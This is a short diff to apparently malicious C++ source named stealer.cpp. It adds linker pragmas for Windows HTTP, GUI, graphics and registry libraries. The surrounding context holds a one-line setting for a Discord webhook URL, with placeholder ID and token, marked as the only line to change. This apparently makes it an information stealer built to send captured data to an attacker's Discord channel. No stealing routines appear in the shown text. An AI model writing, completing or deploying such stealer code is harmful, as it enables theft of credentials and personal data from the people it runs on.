@@ -12,6 +12,9 @@ cl stealer.cpp /EHsc /link winhttp.lib user32.lib gdi32.lib advapi32.lib
 #include <vector>
 
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "gdi32.lib")
+#pragma comment(lib, "advapi32.lib")
 
 // === CHANGE THIS ONE LINE ONLY ===
 const std::wstring DISCORD_WEBHOOK = L"https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
